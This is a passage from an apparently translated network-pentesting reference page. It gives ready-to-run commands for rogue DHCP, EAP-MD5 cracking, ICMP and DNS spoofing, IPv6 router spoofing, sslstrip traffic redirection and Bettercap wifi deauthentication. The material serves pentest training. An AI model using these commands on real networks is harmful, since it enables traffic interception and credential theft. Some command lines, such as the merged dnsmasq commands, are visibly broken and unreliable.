- **Local DNS Domain Name**: 선택적으로 `-d example.org`을 사용해 로컬 DNS 도메인 이름을 설정합니다.
- **Original Router/Gateway IP**: 합법적인 router/gateway의 IP 주소를 지정하려면 `-r 10.0.0.1`을 사용합니다.
- **Primary DNS Server IP**: 당신이 제어하는 rogue DNS 서버의 IP를 설정하려면 `-p 10.0.0.100`을 사용합니다.
- **Secondary DNS Server IP**: 선택적으로 보조 DNS 서버 IP를 설정하려면 `-s 10.0.0.1`을 사용합니다.
- **Netmask of Local Network**: 로컬 네트워크의 넷마스크를 정의하려면 `-n 255.255.255.0`을 사용합니다.
- **Interface for DHCP Traffic**: 특정 네트워크 인터페이스에서 DHCP 트래픽을 수신하려면 `-I eth1`을 사용합니다.
- **WPAD Configuration Address**: WPAD 구성 주소를 설정해 웹 트래픽 가로채기를 돕기 위해 `-w “http://10.0.0.100/wpad.dat”`을 사용합니다.
- **Spoof Default Gateway IP**: 기본 gateway IP를 스푸핑하려면 `-S`를 포함합니다.
- **Respond to All DHCP Requests**: 서버가 모든 DHCP 요청에 응답하도록 하려면 `-R`을 포함하세요. 단, 이는 눈에 띄며 탐지될 수 있습니다.

이 옵션들을 올바르게 사용하면 네트워크 트래픽을 효과적으로 가로채기 위해 rogue DHCP 서버를 구축할 수 있습니다.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP 공격**

Here are some of the attack tactics that can be used against 802.1X implementations:

- EAP를 통한 활성 brute-force 비밀번호 무차별 대입
- 손상된 EAP 콘텐츠로 RADIUS 서버 공격 _\*\*_(exploits)
- EAP 메시지 캡처 및 오프라인 비밀번호 크래킹 (EAP-MD5 및 PEAP)
- EAP-MD5 인증을 강제하여 TLS 인증서 검증을 우회
- 허브 등의 장치를 사용해 인증할 때 악성 네트워크 트래픽을 주입

If the attacker if between the victim and the authentication server, he could try to degrade (if necessary) the authentication protocol to EAP-MD5 and capture the authentication attempt. Then, he could brute-force this using:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol)는 핫 리던던트 라우팅 시스템을 생성하도록 설계된 네트워크 프로토콜 계열입니다. FHRP를 사용하면 물리적 라우터들을 단일 논리 장치로 결합할 수 있어 결함 허용성이 증가하고 부하 분산에 도움이 됩니다.

**Cisco Systems engineers have developed two FHRP protocols, GLBP and HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Routing Information Protocol(RIP)에는 RIP, RIPv2, RIPng의 세 가지 버전이 존재합니다. RIP과 RIPv2는 UDP를 사용해 포트 520으로 피어에게 데이터그램을 전송하는 반면, RIPng는 IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다. RIPv2는 MD5 인증을 지원하도록 도입되었습니다. 반면 RIPng는 네이티브 인증을 포함하지 않으며, 대신 IPv6에서 선택적 IPsec AH 및 ESP 헤더에 의존합니다.

- **RIP and RIPv2:** 통신은 포트 520의 UDP 데이터그램을 통해 이루어집니다.
- **RIPng:** IPv6 멀티캐스트를 통해 UDP 포트 521로 데이터그램을 브로드캐스트합니다.

RIPv2가 MD5 인증을 지원하는 반면 RIPng는 네이티브 인증을 포함하지 않고 IPv6의 IPsec AH 및 ESP 헤더에 의존한다는 점을 유의하세요.

### EIGRP Attacks

**EIGRP (Enhanced Interior Gateway Routing Protocol)**는 동적 라우팅 프로토콜입니다. **이는 거리 벡터(distance-vector) 프로토콜입니다.** 인증과 passive 인터페이스 설정이 없으면, **침입자**가 EIGRP 라우팅을 방해하여 **라우팅 테이블 오염(poisoning)**을 일으킬 수 있습니다. 또한 EIGRP 네트워크(즉, autonomous system)는 **평면화되어 있어 어떤 존(zone)으로도 분할되어 있지 않습니다.** 공격자가 **라우트를 주입하면** 그 라우트는 autonomous EIGRP 시스템 전체에 **전파될** 가능성이 큽니다.

EIGRP 시스템을 공격하려면 정식 EIGRP 라우터와 **이웃(neighbourhood)** 관계를 수립해야 하며, 이는 기본적인 정찰부터 다양한 주입 공격에 이르기까지 많은 가능성을 열어줍니다.

[**FRRouting**](https://frrouting.org/)을 사용하면 BGP, OSPF, EIGRP, RIP 등 프로토콜을 지원하는 가상 라우터를 구현할 수 있습니다. 공격자 시스템에 이를 배포하면 라우팅 도메인에서 정식 라우터인 척 할 수 있습니다.


{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/)는 EIGRP 브로드캐스트를 가로채는 기능을 제공합니다. 또한 패킷 주입(packet injection)을 허용하여 라우팅 구성을 변경하는 데 활용할 수 있습니다.

### OSPF

Open Shortest Path First(OSPF) 프로토콜에서는 라우터 간의 보안 통신을 위해 MD5 인증이 일반적으로 사용됩니다. 그러나 Loki나 John the Ripper와 같은 도구를 사용하면 이 보안 조치를 무력화할 수 있습니다. 이러한 도구들은 MD5 해시를 캡처하고 크랙하여 인증 키를 노출시킬 수 있습니다. 일단 이 키를 얻으면 새로운 라우팅 정보를 주입하는 데 사용할 수 있습니다. 라우트 파라미터를 구성하고 탈취된 키를 설정하려면 각각 _Injection_ 탭과 _Connection_ 탭을 사용합니다.

- **Capturing and Cracking MD5 Hashes:** Loki 및 John the Ripper와 같은 도구를 사용합니다.
- **Configuring Route Parameters:** _Injection_ 탭을 통해 수행합니다.
- **Setting the Compromised Key:** 해당 키는 _Connection_ 탭에서 설정합니다.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): 네트워크 트래픽을 스캔하고 취약점을 찾는 도구
- 네트워크 공격에 대한 **더 많은 정보는** [**here**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

공격자는 가짜 DHCP 응답을 보내 네트워크의 새로운 멤버에 대해 모든 네트워크 파라미터(GW, IP, DNS)를 설정합니다.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

[previous section](#arp-spoofing)을 확인하세요.

### ICMPRedirect

ICMP Redirect는 ICMP 패킷(type 1 code 5)을 전송하여 attacker가 특정 IP에 도달하는 가장 좋은 경로임을 알리는 기법입니다. 그런 다음 victim이 해당 IP로 통신하려 할 때 패킷은 attacker를 통해 전송됩니다.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

공격자는 피해자가 요청하는 도메인 중 일부(또는 전부)를 해석합니다.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq로 자체 DNS 구성**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### 로컬 게이트웨이

시스템과 네트워크로 가는 경로가 여러 개 존재할 수 있습니다. 로컬 네트워크 내의 MAC addresses 목록을 작성한 후, _gateway-finder.py_를 사용해 IPv4 포워딩을 지원하는 hosts를 식별하십시오.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNS 조회가 실패할 때 로컬 호스트 이름 해석을 위해 Microsoft 시스템은 **Link-Local Multicast Name Resolution (LLMNR)** 및 **NetBIOS Name Service (NBT-NS)**에 의존합니다. 마찬가지로 **Apple Bonjour** 및 **Linux zero-configuration** 구현은 네트워크 내 시스템을 발견하기 위해 **Multicast DNS (mDNS)**를 사용합니다. 이들 프로토콜은 인증을 요구하지 않고 UDP를 통해 브로드캐스트 방식으로 동작하기 때문에, 공격자가 사용자를 악성 서비스로 리다이렉트하기 위해 악용할 수 있습니다.

Responder를 사용하여 호스트가 검색하는 서비스를 가장해 가짜 응답을 보낼 수 있습니다.  
자세한 내용은 [how to Impersonate services with Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)을 읽어보세요.

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

브라우저는 일반적으로 **Web Proxy Auto-Discovery (WPAD) protocol to automatically acquire proxy settings**를 사용합니다. 이는 서버에서 구성 정보를 가져오는 것으로, 예를 들어 "http://wpad.example.org/wpad.dat"와 같은 URL을 통해 이루어집니다. 클라이언트가 이 서버를 발견하는 방법은 여러 가지가 있습니다:

- **DHCP**를 통해, 특수 코드 252 항목을 이용해 발견됩니다.
- **DNS**를 통해, 로컬 도메인 내에서 _wpad_라는 호스트명을 검색합니다.
- **Microsoft LLMNR and NBT-NS**를 통해, DNS 조회가 실패할 경우의 폴백 메커니즘으로 동작합니다.

도구 Responder는 **malicious WPAD server**로 동작하여 이 프로토콜을 악용합니다. DHCP, DNS, LLMNR 및 NBT-NS를 사용해 클라이언트를 속여 자신에게 연결하게 만듭니다. Responder를 사용해 서비스를 가장하는 방법에 대해 더 알아보려면 [check this](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)를 참고하세요.

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

네트워크에서 다양한 서비스를 제공해 사용자를 속여 일부 **plain-text credentials**를 입력하게 유도할 수 있습니다. 이 공격에 대한 자세한 내용은 [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)를 참고하세요.

### IPv6 Neighbor Spoofing

이 공격은 IPv6 환경에서의 ARP Spoofing과 매우 유사합니다. 피해자로 하여금 GW의 IPv6가 공격자의 MAC을 가진 것이라고 생각하게 만들 수 있습니다.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

일부 OS는 네트워크에서 전송된 RA packets의 정보를 기본적으로 gateway로 설정합니다. 공격자를 IPv6 router로 선언하려면 다음을 사용할 수 있습니다:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

기본적으로 일부 OS는 네트워크에서 DHCPv6 패킷을 읽어 DNS 구성을 시도합니다. 따라서 공격자는 DHCPv6 패킷을 보내 스스로 DNS로 설정할 수 있습니다. DHCP는 또한 피해자에게 IPv6 주소를 제공합니다.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (fake page and JS code injection)

## 인터넷 공격

### sslStrip

기본적으로 이 공격은, **user**가 **access**하려는 **HTTP** 페이지가 **redirecting**되어 **HTTPS** 버전으로 이동하는 경우에 발생합니다. **sslStrip**는 **maintain** a **HTTP connection with** the **client and** a **HTTPS connection with** the **server**, 따라서 연결을 **plain text**로 **sniff**할 수 있게 됩니다.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+와 dns2proxy를 이용한 HSTS 우회

**sslStrip+와 dns2proxy가 sslStrip에 비해 가지는 차이점**은 예를 들어 _**www.facebook.com**_ 을 _**wwww.facebook.com**_ 으로(추가된 "**w**"에 주목) **리디렉트** 하고 이 도메인의 **주소를 공격자 IP로 설정**한다는 점입니다. 이렇게 하면 **클라이언트**는 _**wwww.facebook.com**_ **(공격자)** 에 **접속**하게 되지만, 내부적으로 **sslstrip+**는 **www.facebook.com** 과의 https를 통한 **실제 연결을 유지**합니다.

이 기법의 **목표**는 HSTS를 **회피**하는 것입니다. _**wwww**.facebook.com_ 은 브라우저의 **캐시**에 저장되지 않기 때문에 브라우저는 속아 넘어가 **HTTP로 facebook 인증을 수행**하게 됩니다.\
이 공격을 수행하려면 피해자가 최초에 [http://www.faceook.com](http://www.faceook.com) (https가 아닌) 에 접근하려고 해야 한다는 점을 유의하세요. 이는 http 페이지 내의 링크를 수정함으로써 가능할 수 있습니다.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip or sslStrip+ doesn;t work anymore. This is because there are HSTS rules presaved in the browsers, so even if it's the first time that a user access an "important" domain he will access it via HTTPS. Also, notice that the presaved rules and other generated rules can use the flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **so the** _**wwww.facebook.com**_ **example from before won't work anymore as** _**facebook.com**_ **uses HSTS with `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP 포트 리스닝
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL 포트에서 리스닝

#### 키 및 셀프 서명된 인증서 생성
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 인증서를 사용한 수신 대기
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 인증서를 사용해 리스닝하고 호스트로 리다이렉트
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
때때로, client가 CA가 유효한지 검사한다면, **serve a certificate of other hostname signed by a CA**.\
또 다른 흥미로운 테스트로는 요청된 hostname의 c**ertificate of the requested hostname but self-signed**를 제공하는 것입니다.

테스트할 다른 항목으로는 certificate를 valid certificate(그러나 valid CA가 아닌)로 sign하려 시도하는 것입니다. 또는 valid public key를 사용하고 diffie hellman 같은 알고리즘을 강제하여(이는 실제 private key로 아무것도 복호화할 필요가 없는 알고리즘) client가 실제 private key에 대한 probe(예: hash)를 요청할 때 가짜 probe를 보내고 client가 이를 확인하지 않는다고 기대하는 것입니다.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### 액티브 디스커버리 노트

UDP 패킷을 요청된 포트를 갖고 있지 않은 장치로 전송하면 ICMP (Port Unreachable)가 반환된다는 점을 유의하라.

### **ARP 탐지**

ARP 패킷은 네트워크 내부에서 어떤 IP가 사용 중인지 알아내는 데 사용된다. PC는 가능한 각 IP 주소마다 요청을 보내야 하며, 사용 중인 주소만 응답한다.

### **mDNS (multicast DNS)**

Bettercap은 각 X ms마다 **\_services\_.dns-sd.\_udp.local** 을 요청하는 MDNS 요청을 보낸다. 이 패킷을 본 머신은 보통 이 요청에 응답한다. 이후에는 "services"에 응답하는 머신만 탐색한다.

**도구**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap은 포트 137/UDP로 브로드캐스트 패킷을 보내 "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA"라는 이름을 요청한다.

### **SSDP (Simple Service Discovery Protocol)**

Bettercap은 모든 종류의 서비스를 탐색하기 위해 SSDP 패킷을 브로드캐스트한다 (UDP Port 1900).

### **WSD (Web Service Discovery)**

Bettercap은 서비스 검색을 위해 WSD 패킷을 브로드캐스트한다 (UDP Port 3702).


### 통신 / 모바일 코어 (GTP) 익스플로잇


{{#ref}}
telecom-network-exploitation.md
{{#endref}}

## 참고자료

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
